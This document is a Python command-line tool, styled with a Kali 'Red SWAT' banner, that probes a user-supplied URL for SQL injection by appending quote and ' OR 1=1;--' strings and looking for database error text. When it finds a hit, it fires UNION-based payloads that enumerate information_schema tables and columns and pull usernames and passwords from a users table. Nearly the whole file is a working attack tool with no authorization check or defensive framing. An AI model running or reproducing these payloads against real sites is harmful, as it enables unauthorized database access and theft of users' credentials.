import sys
import requests
from rich.table import Table
from termcolor import colored
from rich.console import Console

SQL_INJECTIONS = ("' OR 1=1;--", "'")
SQL_PAYLOADS = (
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "' ORDER BY 1--",
    "' ORDER BY 10--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
)
SQL_ERRORS = ("mysql", "sql", "syntax", "error", "warning", "microsoft", "odbc", "oracle", "postgresql", "sqlite")
console = Console()


def show_banner():
    banner1 = """
        -----------------------------------
        S  Q  L --- 💉  N  J  E  C  T  O  R
        -----------------------------------
    """
    banner2 = (colored("    ┌──(", "cyan") + colored("root㉿kali", "red") + colored(")-[", "cyan") + colored(
        "root/kali/Desktop", "white") + colored(']', "cyan"))
    banner3 = colored("    └─", "cyan") + colored('#', "red") + colored(" a2ps", "blue") + colored(
        " scanp http://lookatthisite.com --script=sql-injector", "white")
    banner4 = colored("[+] Available injection \"'OR 1=1;--\"!", "green")
    banner5 = colored("[*] Injecting \"'OR 1=1;--\"...", "yellow")
    banner6 = colored("[+] Authorized!", "green")

    print(banner1)
    print(banner2)
    print(banner3)
    print(banner4)
    print(banner5)
    print(banner6)

    print(colored("    [💉] Script mode: ", "light_yellow") + colored("🔴 Red SWAT", "red"))
    print(colored("    [💉] Function: ", "light_yellow") + colored("Scan & use SQL-Injection\n", "red"))


def scan_for_sqli(link):
    isAvailableSQLi = False
    table = Table()
    table.title = "Available SQL injections"
    table.add_column("№")
    table.add_column("SQLi")
    print(colored(f"[*] Scanning {link} for SQLi...", "yellow"))

    for id, inj in enumerate(SQL_INJECTIONS, start=1):
        try:
            response = requests.get(f"{link}{inj}", timeout=3)
            found_error = False
            for err in SQL_ERRORS:
                if err in response.text.lower():
                    found_error = True
                    break
            if found_error:
                isAvailableSQLi = True
                table.add_row(str(id), inj)
        except:
            pass
    if isAvailableSQLi:
        print(colored("[+] SQLi vulnerability detected!", "green"))
        console.print(table)
        return True
    return False


def inject_sql(link):
    print(colored(f"[*] Injecting SQLi in {link}...", "yellow"))
    for payload in SQL_PAYLOADS:
        try:
            response = requests.get(f"{link}{payload}", timeout=3)
            print(colored(f"[*] Payload: {payload}", "cyan"))
            print(colored(f"[*] Status code: {response.status_code}", "yellow"))
            print(colored(f"[*] Response: {response.text[:200]}", "green"))
            print("-" * 50)
        except:
            pass

show_banner()
if len(sys.argv) > 1:
    link = sys.argv[1]
else:
    link = input(colored("[*] Enter the target link: ", "yellow"))
if scan_for_sqli(link):
    inject_sql(link)
else:
    print(colored("[-] No SQLi vulnerability found", "red"))
